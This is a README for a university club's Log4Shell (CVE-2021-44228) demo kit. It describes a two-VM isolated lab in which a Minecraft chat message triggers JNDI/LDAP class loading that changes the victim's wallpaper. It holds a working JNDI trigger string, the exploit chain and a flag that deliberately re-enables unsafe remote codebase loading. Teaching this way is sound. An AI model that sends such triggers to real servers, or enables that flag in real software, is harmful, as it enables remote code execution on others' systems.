# EHAX Open House — Log4Shell Demo Kit

A safe, self-contained demo of **CVE-2021-44228 (Log4Shell)** for the EHAX DTU
Open House. A kid sends one Minecraft chat message; the victim server loads a
tiny Java class from the attacker VM and changes its own desktop wallpaper to
the branded EHAX reveal image.

The vulnerability is real (Minecraft 1.8.8 ships Log4j 2.0-beta9), but the
payload is deliberately harmless: **wallpaper only**, no shell, no files, no
data access, no persistence. Everything runs in two isolated VMs on a host-only
network with no internet uplink.

---

## The 30-second version

**Victim VM** (screen the audience sees):

```bash
cd victim
./start-server.sh          # then minimise this terminal; keep desktop visible
```

**Attacker VM** (operator terminal):

```bash
cd attacker
./build-payload.sh         # once, before the event (needs internet)
./run-demo.sh --ip 10.10.10.10 --victim 10.10.10.20
```

The kid presses **Enter** at the prompt (or types the trigger). The victim
wallpaper changes. That's the reveal.

No Minecraft client, Microsoft account, or second game install is needed. The
included `chat-send.py` speaks just enough of the 1.8.8 protocol to send one
normal chat packet to an offline-mode server.

## Architecture

```text
   ATTACKER VM 10.10.10.10                      VICTIM VM 10.10.10.20
   ┌───────────────────────────┐                ┌───────────────────────────┐
   │ LDAP referral   :1389     │◄── JNDI ───────│ Minecraft 1.8.8 server    │
   │ HTTP payload    :8000     │◄── class ──────│ Java 8 + Log4j 2.0-beta9  │
   │ chat-send.py   ───────────┼── chat :25565 ►│ desktop wallpaper visible │
   └───────────────────────────┘                └───────────────────────────┘
             host-only network, no internet uplink
```

1. The kid sends `${jndi:ldap://10.10.10.10:1389/a}` in Minecraft chat.
2. Minecraft writes the chat line to its log.
3. Log4j sees the JNDI pattern and calls the attacker's LDAP server.
4. The LDAP server refers Log4j to `http://10.10.10.10:8000/#WallpaperPayload`.
5. The JVM downloads `WallpaperPayload.class`, loads it, and runs its static
   initializer.
6. The payload downloads `ehax-wallpaper.png` from the same private HTTP
   server and sets it as the current user's wallpaper.

### Wait — not netcat?

`nc` cannot host an LDAP referral. Netcat is a raw TCP pipe; Log4j needs a
speaker of the LDAP protocol. This kit uses
[marshalsec](https://github.com/mbechler/marshalsec)'s
`LDAPRefServer` for that, and Python's `http.server` for the class/wallpaper.
If someone on the team says "LDAP through nc", that is the one thing to correct
before the event.

## Network setup

Use two VMs on a **host-only / private** network:

| VM | IP | Services |
|---|---|---|
| Attacker | `10.10.10.10/24` | LDAP 1389, HTTP 8000, chat sender |
| Victim | `10.10.10.20/24` | Minecraft 25565, desktop |

- No NAT, no bridged adapter, no internet uplink during the demo.
- Static IPs; no DHCP surprises.
- Disable host firewalls for these two VMs, or allow only the three ports above
  between the two VM IPs.
- Test both directions before the first group.

If your hypervisor's host-only network uses a different subnet, change the IPs
consistently in `run-demo.sh --ip/--victim` and the trigger.

### Multiple stations

The kit is one station. To scale, duplicate it with unique IPs on the same
host-only network, or give each station its own isolated network:

| Station | Attacker | Victim |
|---|---|---|
| 1 | `10.10.10.10` | `10.10.10.20` |
| 2 | `10.10.10.11` | `10.10.10.21` |
| 3 | `10.10.10.12` | `10.10.10.22` |

Ports can stay `1389/8000/25565` because the IPs differ. Each station runs its
own `run-demo.sh --ip <its attacker IP> --victim <its victim IP>`. Do not let two
stations share a victim or an attacker VM; the LDAP callbacks and Minecraft
logs get confusing, and the isolation story gets weaker.

## Tested status

What was verified while building this kit:

- JNDI referral → class download → static initializer execution on Java 8u512.
- Full chain against a real **Minecraft 1.8.8** server using the included Python
  chat client: the server log shows the chat line and the payload proof file.
- Wallpaper change on macOS (the test machine) with the same class.
- The Linux `gsettings` path and Windows PowerShell path are implemented but
  **must be dry-run on the actual victim VM before the event**. Do that once;
  do not discover a desktop-environment quirk in front of an audience.

The victim's start script sets
`-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`. Java 8u191+ disables remote
codebase loading by default, so this flag recreates the 2021 conditions in the
lab. It is deliberately unsafe and must never be used outside the VM.

## Before the event

- [ ] Build the attacker folder once with internet: `cd attacker && ./build-payload.sh`
- [ ] Copy the whole folder to both VMs (or at least `attacker/` to attacker and
      `victim/` + `server.jar` to victim).
- [ ] Victim: Java 8 installed, `server.jar` present, `./start-server.sh` works.
- [ ] Attacker: Python 3 + Java present; `./run-demo.sh ... --no-chat` starts both
      servers; `curl http://10.10.10.10:8000/WallpaperPayload.class -I` returns 200.
- [ ] Test one full run with `EHAX_PAYLOAD_DRY_RUN=1` on the victim, then one
      real wallpaper run.
- [ ] Take a clean VM snapshot of the victim with the normal wallpaper and the
      server running (or ready to start).
- [ ] Record a 20-second backup video of a successful reveal on a phone/laptop.
- [ ] Print `docs/STATION_CARD.md` for each station.

## Safety rules (short version)

1. **Isolated VMs only.** No real laptops, no college systems, no public IPs.
2. **No internet uplink** during the demo.
3. Keep the payload benign: wallpaper, optional sound, temp proof file. No
   reverse shell, no file reads, no persistence, no credential access.
4. Say the line every time: *“Bina permission ke apne ya kisi aur ke system pe
   try karna illegal hai.”*
5. If the network is not isolated, stop and fix it before running anything.

Full details: [`docs/SAFETY.md`](docs/SAFETY.md).

---

## Why the extra guardrails?

The payload checks `EHAX_LAB=1` before doing anything. Without that environment
variable it logs a refusal and exits. It also refuses to download from a
non-private host. These are deliberate interlocks so the same class cannot
silently become a public demo on an unconfigured server.

The demo still shows the real lesson: **one user-controlled string reached a
logging library, which made a network request and executed code with the
server's permissions.** The only difference is that our code is polite.
